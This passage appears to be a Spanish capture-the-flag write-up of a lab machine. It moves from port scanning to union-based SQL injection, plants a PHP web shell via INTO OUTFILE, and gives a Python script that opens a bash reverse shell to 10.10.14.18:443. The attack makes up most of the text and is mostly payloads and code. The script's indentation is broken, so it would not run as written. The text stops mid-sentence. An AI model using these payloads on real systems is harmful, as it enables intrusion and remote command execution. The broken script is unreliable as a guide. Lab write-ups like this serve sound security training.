## Reconocimiento

`nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.116 -oG allPorts`

`nmap -p 22,80,4566,8080 -sCV -vvv 10.10.11.116 -oN targeted`

```
22/ssh
80/http
4566/http
8080/http
```

Navegamos al puerto 80.
Probando a introducir valores vemos que es vulnerable a HTMLinjection, También a Inyecciones XSS

Interceptamos la petición con Burpsuite, y vemos que en el campo de selección de países se puede inyectar código SQL y se ven reflejados en la web

`' union select database()-- -` Enumerar base de datos acctual `registration`

`' union select schema_name from information_schema.schemata-- -` Enumerar todas las bases de datos

`' union select table_name from information_schema.tables where table_schema="registration"-- -` Enumerar las tables de la base de datos registration.

`union select column_name from information_schema.columns where table_schema="registration" and table_name="registration"-- -` Enumerar las columnas

`' union select group_concat(username,0x3a,userhash) from registration-- -` Obtener los valores de las columnas

BBDD:
`registration`
Tables:
`registration`
Columns:
`username` `userhash` `country` `regtime`
Valores:
Se nos muestran los valores de prueba que hemos generado nosotros anteriormente, y esos no nos valen

Validaremos si somos capacidades de depositar contenido en una ruta
`' union select "probando" into outfile "/var/www/html/prueba.txt"-- -` somos capaces de poder depositar contenido en diversas rutas

Como interpreta PHP la idea es inyectara un archivo de este tipo
`' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/prueba.php"-- -`

Esto nos permite desde la URL acceder a `prueba.php` y con el parámetro `cmd` ejecutar comandos en el sistema

Una vez identificado todo esto podemos crear un script en Python que nos lo automatice:
```python
#!/usr/bin/python3

from pwn import *
import signal, pdb, requests

def def_handler(sig, frame):
	print("\n[!] Saliendo...\n")
	sys.exit(1)

# CTRL + C
signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) != 3:
	log.failure("Uso: %s <ip-address> filename" % sys.argv[0])
	sys.exit(1)

# Variables globales
ip_address = sys.argv[1]
filename = sys.argv[2]
main_url = "http://%s/" % ip_address
lport = 443


def createFile():
	data_post = {
	'username': 'admin',
	'country':"""Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/%s"-- -""" % (filename)
	}

r = requests.post(main_url, data=data_post)


def getAccess():
	data_post = {
	'cmd': "bash -c 'bash -i >& /dev/tcp/10.10.14.18/443 0>&1'"
	}

r = requests.post(main_url + "%s" % filename, data=data_post)

if __name__ == "__main__":

createFile()
try:
	threading.Thread(target=getAccess, args=()).start()
except Exception as e:
	log.error(str(e))
	
shell = listen(lport, timeout=30).wait_for_connection()
shell.interactive()
```

Este script nos generara una shell en nuestra propia maquina a la hora de ejecutarlo.
Una vez accedido a la maquina en el directorio en el que nos encontramos 